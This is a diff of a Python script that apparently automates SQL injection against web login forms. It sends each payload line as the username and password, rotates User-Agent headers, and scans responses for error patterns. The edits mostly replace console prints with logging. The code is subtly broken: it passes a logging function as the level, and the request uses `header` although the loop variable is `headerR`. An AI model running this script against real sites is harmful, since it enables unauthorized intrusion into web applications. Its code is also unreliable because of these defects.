@@ -41,7 +41,8 @@ headers = {
 
 
 #
-logging.basicConfig(filename="SQLJ.log", level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(filename="SQLJ.log", level=logging.info, format='%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
+
 
 # Create a logger (optional, you can skip this if you only use basicConfig)
 logger = logging.getLogger('my_logger')
@@ -62,32 +63,28 @@ async def auth_SQL_inj_HEADER(urls):
             rows = payload.split("\n") 
             sorted_rows = sorted(rows) 
             sorted_payload = "\n".join(sorted_rows) #* 
-            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) 
+            logger.info(sorted_payload)
             requests.packages.urllib3.disable_warnings()  
             req = requests.get(url=urls,verify=False) 
-            # assert req.status_code == 200
             if req.status_code == 200: 
                 ask = input(f"[{datetime.now()}]{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}[INFO]**Looks like the host is up: {Fore.RESET}{Fore.YELLOW}{urls} {Fore.RESET}{Fore.GREEN} \nDo you want to send the payload above to the website?** ")
-                logging.info(f"Could get a 200 request for the target: {urls} in the time : {datetime.now()}")
+                logger.info(f"The website:{urls}")
 
                 if ask.lower() == "y":
                     for line in sorted_payload.split("\n"): 
-                        #############################################################33
+
                         params = { 
                             "username": line,
                             "password": line
                         }
-                        ##############################################################################
-                        # print(line)
+
                         await Prepare_the_headers()
                         for headerR in headers:
-                            ack = requests.post(url=urls, data=params,verify=False,headers={"User-Agent": header}) 
-                            print(f"[{datetime.now()}]|**[INFO]Current payload: | {Fore.RESET}{Style.BRIGHT}{line} |with status code|:{Fore.RESET}{Fore.BLUE}{ack.status_code}\n|Headers:|{header}**") 
-                            # print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
+                            ack = requests.post(url=urls, data=params,verify=False,headers={"User-Agent": header})
+                            logger.info(f"Testing payload:{line} including headers:{headerR}") 
                             await asyncio.sleep(5) 
                             if "error" in ack.text: 
-                                print(f"[{datetime.now()}]{Fore.RESET}{Fore.LIGHTWHITE_EX}|**[INFO]Vulnerability found in the response code:|ack.text\n|Headers:|{header}**")
-                                
+                                logger.info(f"Could find parameter Error,keyword:{line}")                               
                             vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) 
                             htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                             if vuln: 
